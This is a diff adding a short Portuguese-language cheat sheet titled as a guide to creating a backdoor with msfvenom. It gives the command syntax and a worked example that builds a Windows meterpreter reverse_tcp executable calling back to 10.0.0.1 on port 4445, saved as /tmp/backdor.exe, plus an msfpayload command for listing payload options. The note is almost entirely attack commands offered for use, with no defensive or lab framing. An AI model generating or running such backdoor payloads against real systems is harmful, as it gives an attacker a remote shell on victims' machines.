@@ -1,0 +1,18 @@
+COMO CRIAR UMA BACKDOR COM O MSFVENOM
+
+COMANDO:
+
+msfvenom -p [payload desejado] val=[valores das opções do payload] x86(plataforma opc) -f [extenção do arquivo] > [endereço de saída do arquivo]
+
+Ex.
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4445 x86 -f exe > /tmp/backdor.exe
+
+___________________________________________________
+
+PARA VERIFICAR AS OPÇÕES DE UMA PAYLOAD
+
+COMANDOS
+
+msfpayload windows/meterpreter/reverse_tcp O
+
+o msfpayload é utilizado para gerar shellcode de payloads para exploits
